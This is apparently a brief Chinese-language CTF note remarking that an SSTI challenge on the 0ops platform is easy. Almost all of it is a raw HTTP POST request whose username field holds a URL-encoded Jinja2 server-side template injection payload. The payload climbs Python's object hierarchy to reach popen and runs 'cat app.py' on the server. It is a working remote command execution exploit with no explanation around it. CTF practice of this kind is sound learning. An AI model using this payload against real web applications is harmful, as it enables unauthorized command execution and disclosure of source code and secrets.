感觉0ops上的ssti好简单啊

```php
POST /show HTTP/1.1
Host: web1.0ops.sjtu.cn:40022
Content-Length: 124
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://web1.0ops.sjtu.cn:40022
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web1.0ops.sjtu.cn:40022/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=eyJyb2xlIjoidXNlciJ9.ZPMrww.bmaymKDfqi80d1pwY4HhC6u9T4k
Connection: close

username=%7b%7b().__class__.__mro__%5b1%5d.__subclasses__()%5b117%5d.__init__.__globals__.popen('cat%20app.py').read()%7d%7d
```

